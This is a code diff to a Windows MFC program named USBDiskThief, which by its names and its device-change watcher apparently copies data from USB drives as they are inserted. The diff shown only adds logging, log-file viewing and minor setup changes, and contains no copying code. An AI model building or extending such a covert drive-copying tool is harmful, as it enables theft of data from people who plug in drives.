@@ -12,7 +12,7 @@
 #include <windowsx.h>
 #include "PathTools.h"
 #include "Watch.h"
-#include "Log.h"
+#include "Logger.h"
 
 
 
@@ -133,27 +133,35 @@ BOOL CUSBDiskThiefDlg::OnInitDialog()
 
 	// TODO: Add extra initialization here
 
+	setlocale(LC_ALL, "chs");
+	//初始化日志
+	InitLoggerByFile(L"USDDiskThief.txt");
+	RecordTimeAndLog(L"初始化日志");
+
 	//设置默认保存路径
 	TCHAR ptaDrive[MAX_PATH] = { 0 };
 	if (GetMAXFreeSpaceDiskDrive(ptaDrive, MAX_PATH))
 	{
 		wcscat_s(ptaDrive, MAX_PATH,L"USBDriveThiefTest");
 		SetDlgItemText(IDC_STATIC_SAVE_PATH, ptaDrive);
-
+		RecordTimeAndLog(L"设置默认路径");
 	}
 
 	//注册热键
 	RegisterHotKey(m_hWnd, HOT_KEY_ALT_G, MOD_ALT, 0x4D);
+	RecordTimeAndLog(L"注册热键");
 
 	//获取最初驱动
 	PrevDriveList = GetLogicalDrives();
+	RecordTimeAndLog(L"获取最初驱动");
 
-	//初始化日志
-	InitLogFile();
 
 	//默认属性
 	CWnd* cWnd = GetDlgItem(IDC_CHECK2);
 	Button_SetCheck(cWnd->m_hWnd, BST_CHECKED);
+	RecordTimeAndLog(L"设置控件默认属性");
+
+
 
 
 	return TRUE;  // return TRUE  unless you set the focus to a control
@@ -425,6 +433,8 @@ void CUSBDiskThiefDlg::OnBnClickedButtonEndWatch()
 	}
 
 
+
+
 }
 
 
@@ -435,7 +445,7 @@ BOOL CUSBDiskThiefDlg::OnDeviceChange(UINT nEventType, DWORD_PTR dwData)
 
 	DWORD CurrenDriveList = 0;
 	DWORD NewDrive = 0;
-	DWORD DriveNumber = 0;
+	CHAR DriveNumber = 0;
 	TCHAR drive[4] = L"C:\\";
 	//CDialogEx::OnDeviceChange(nEventType, dwData);
 
@@ -502,13 +512,17 @@ void CUSBDiskThiefDlg::OnBnClickedCancel()
 {
 	// TODO: Add your control notification handler code here
 	EndWatch();
+	CloseLogger();
 	CDialogEx::OnCancel();
 }
 
 
 void CUSBDiskThiefDlg::OnBnClickedButtonShowLog()
 {
-
-
 	// TODO: Add your control notification handler code here
+	TCHAR LogFilePath[MAX_PATH] = { 0 };
+
+	if (GetLogFilePath(LogFilePath, MAX_PATH))
+		ShellExecute(NULL, L"open", LogFilePath, NULL, NULL, SW_SHOWNORMAL);
+
 }
